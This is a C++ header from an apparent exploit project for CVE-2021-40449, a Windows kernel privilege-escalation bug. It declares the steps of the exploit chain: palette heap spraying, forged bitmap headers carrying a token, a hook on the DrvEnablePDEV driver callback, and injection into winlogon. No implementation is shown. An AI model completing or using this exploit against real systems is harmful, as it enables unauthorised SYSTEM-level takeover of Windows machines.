#pragma once
#define WIN32_LEAN_AND_MEAN
#include "include/core/def.hpp"
#include "include/utils/gadget.hpp"
#include "include/common/gadget.hpp"
#include "include/common/memtools.hpp"
#include "include/describe/vuln_description.hpp"
#include <vector>
#include <tlhelp32.h>

namespace CVE_2021_40449
{
    VOID InjectToWinlogon();
    VOID EXPSprayPalettes(DWORD size);
    DWORD64 CreateForgedBitMapHeader(DWORD64 token);
    DHPDEV EXPhook_DrvEnablePDEV(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);

    bool Exp();
} // namespace CVE_2021_40449